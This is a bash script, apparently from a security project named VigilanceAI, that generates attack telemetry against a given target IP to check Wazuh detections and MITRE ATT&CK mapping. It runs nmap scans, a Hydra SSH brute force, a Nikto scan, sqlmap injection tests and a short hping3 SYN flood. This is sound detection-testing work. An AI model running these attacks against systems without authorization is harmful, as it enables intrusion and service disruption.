#!/bin/bash
# VigilanceAI - Attack Simulation Script
# Purpose: Generate diverse attack telemetry against YOUR OWN authorized EC2 target
#          to validate Wazuh detection + MITRE ATT&CK mapping coverage.
# Usage:   sudo ./attack_simulation.sh <TARGET_IP>
# WARNING: Only run against infrastructure you own/control and are authorized to test.

set -uo pipefail

TARGET="${1:-}"
if [[ -z "$TARGET" ]]; then
    echo "Usage: $0 <TARGET_IP>"
    exit 1
fi

LOGFILE="attack_sim_$(date +%Y%m%d_%H%M%S).log"
echo "=== VigilanceAI Attack Simulation against $TARGET ===" | tee -a "$LOGFILE"
echo "Started: $(date)" | tee -a "$LOGFILE"

pause() { sleep 2; }

section() {
    echo "" | tee -a "$LOGFILE"
    echo "### $1 ###" | tee -a "$LOGFILE"
}

# ---------- LEVEL 1: Reconnaissance (MITRE TA0043) ----------
section "Reconnaissance - Nmap Port/Service Scan"
nmap -sV -T4 "$TARGET" 2>&1 | tee -a "$LOGFILE"
pause

section "Reconnaissance - Aggressive OS/Script Scan"
nmap -A -T4 "$TARGET" 2>&1 | tee -a "$LOGFILE"
pause

section "Reconnaissance - Full Port Sweep"
nmap -p- -T4 "$TARGET" 2>&1 | tee -a "$LOGFILE"
pause

# ---------- LEVEL 2: Credential Access (MITRE TA0006) ----------
section "Brute Force - SSH (Hydra)"
# Requires a small wordlist; using rockyou sample or a throwaway list
if [[ -f /usr/share/wordlists/rockyou.txt ]]; then
    hydra -l fakeuser -P /usr/share/wordlists/rockyou.txt -t 4 -f "$TARGET" ssh 2>&1 | tee -a "$LOGFILE"
else
    echo "password123" > /tmp/wordlist.txt
    echo "admin123" >> /tmp/wordlist.txt
    hydra -l fakeuser -P /tmp/wordlist.txt -t 4 -f "$TARGET" ssh 2>&1 | tee -a "$LOGFILE"
fi
pause

section "Brute Force - Repeated SSH Failed Logins (simple loop)"
for i in {1..8}; do
    ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 "baduser$i@$TARGET" exit 2>&1 | tee -a "$LOGFILE"
done
pause

# ---------- LEVEL 3: Web Application Attacks (MITRE T1190) ----------
section "Web Recon - Nikto Vulnerability Scan"
nikto -h "http://$TARGET" 2>&1 | tee -a "$LOGFILE"
pause

section "Web Attack - SQLMap Injection Test (dashboard/API endpoint)"
echo "NOTE: adjust the URL below to an actual parameterized endpoint on your app"
sqlmap -u "http://$TARGET:8000/reports/1" --batch --level=2 --risk=2 2>&1 | tee -a "$LOGFILE"
pause

# ---------- LEVEL 4: Denial of Service / Impact (MITRE T1499) - LOW INTENSITY ----------
section "Impact - Light SYN Flood Test (hping3, short burst only)"
timeout 10 hping3 -S --flood -p 80 "$TARGET" 2>&1 | tee -a "$LOGFILE"
pause

# ---------- LEVEL 5: Discovery on host (if you have shell access) ----------
section "Discovery - Service Enumeration via curl"
curl -sI "http://$TARGET" 2>&1 | tee -a "$LOGFILE"
curl -sI "http://$TARGET:3000" 2>&1 | tee -a "$LOGFILE"
curl -sI "http://$TARGET:8000" 2>&1 | tee -a "$LOGFILE"

echo "" | tee -a "$LOGFILE"
echo "=== Simulation complete: $(date) ===" | tee -a "$LOGFILE"
echo "Check Wazuh alerts.json, forwarder logs, and dashboard for corresponding detections."
